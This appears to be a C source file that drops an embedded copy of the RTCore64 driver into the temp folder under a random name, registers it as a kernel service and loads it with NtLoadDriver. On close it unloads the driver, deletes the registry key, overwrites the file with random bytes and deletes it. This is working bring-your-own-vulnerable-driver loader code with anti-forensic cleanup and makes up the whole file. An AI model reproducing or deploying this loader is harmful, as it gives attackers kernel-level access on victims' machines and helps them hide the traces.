#include <Windows.h>
#include <winternl.h>
#include <stdint.h>

#include <stdio.h>

#include "util.h"

NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
NTSTATUS NTAPI NtLoadDriver(PUNICODE_STRING DriverServiceName);
NTSTATUS NTAPI NtUnloadDriver(PUNICODE_STRING DriverServiceName);

#define SE_LOAD_DRIVER_PRIVILEGE	10
#define DRIVER_NAME_MAX			16
#define SERVICE_TYPE_KERNEL		1

static uint8_t driverBin[] = 
#include "rtcore64.h"
;

static struct {
	wchar_t		serviceReg[MAX_PATH];
	wchar_t		driverReg[MAX_PATH];
	UNICODE_STRING	driverStr;
	wchar_t		path[MAX_PATH];
} state;

void driver_open() {
	wchar_t name[DRIVER_NAME_MAX], driverPath[MAX_PATH];
	uint32_t i, n;
	BOOLEAN enabled;
	HKEY key;
	HANDLE hFile;
	DWORD type = SERVICE_TYPE_KERNEL;

	n = rand_range(5, DRIVER_NAME_MAX - 1);
	for (i = 0; i < n; ++i) {
		name[i] = rand_range('A', 'Z');
	}
	name[n] = 0;

	lstrcpyW(state.serviceReg, L"SYSTEM\\CurrentControlSet\\Services\\");
	lstrcatW(state.serviceReg, name);

	lstrcpyW(state.driverReg, L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\");
	lstrcatW(state.driverReg, name);

	RtlInitUnicodeString(&state.driverStr, state.driverReg);

	GetTempPathW(MAX_PATH, state.path);
	lstrcatW(state.path, name);

	lstrcpyW(driverPath, L"\\??\\");
	lstrcatW(driverPath, state.path);

	printf("%ls\n", name);
	printf("%ls\n", state.serviceReg);
	printf("%ls\n", state.driverReg);
	printf("%ls\n", state.path);
	printf("%ls\n", driverPath);

	if (!NT_SUCCESS(RtlAdjustPrivilege(SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &enabled))){
		//im not admin
		ExitProcess(0);
		return;
	}

	hFile = CreateFileW(state.path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	WriteFile(hFile, driverBin, sizeof(driverBin), NULL, NULL);
	FlushFileBuffers(hFile);
	CloseHandle(hFile);

	RegCreateKeyW(HKEY_LOCAL_MACHINE, state.serviceReg, &key);
	RegSetKeyValueW(key, NULL, L"ImagePath", REG_EXPAND_SZ, driverPath, (lstrlenW(driverPath) + 1)*sizeof(wchar_t));
	RegSetKeyValueW(key, NULL, L"Type", REG_DWORD, &type, sizeof(DWORD));
	RegCloseKey(key);

	NTSTATUS status;
	status = NtLoadDriver(&state.driverStr);
	printf("0x%X\n", status);
}

void driver_close() {
	HKEY key;
	SIZE_T i;
	HANDLE hDriver;
	HANDLE hFile;
	BYTE k;

	NtUnloadDriver(&state.driverStr);
	RegDeleteKeyW(HKEY_LOCAL_MACHINE, state.serviceReg);

	hFile = CreateFileW(state.path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	SetFilePointer(hFile, 0, NULL, FILE_BEGIN);
	for (i = 0; i < sizeof(driverBin); ++i) {
		k = (BYTE)(rand_next() & 0xFF);
		WriteFile(hFile, &k, 1, NULL, NULL);
	}
	FlushFileBuffers(hFile);

	CloseHandle(hFile);
	_wremove(state.path);
}
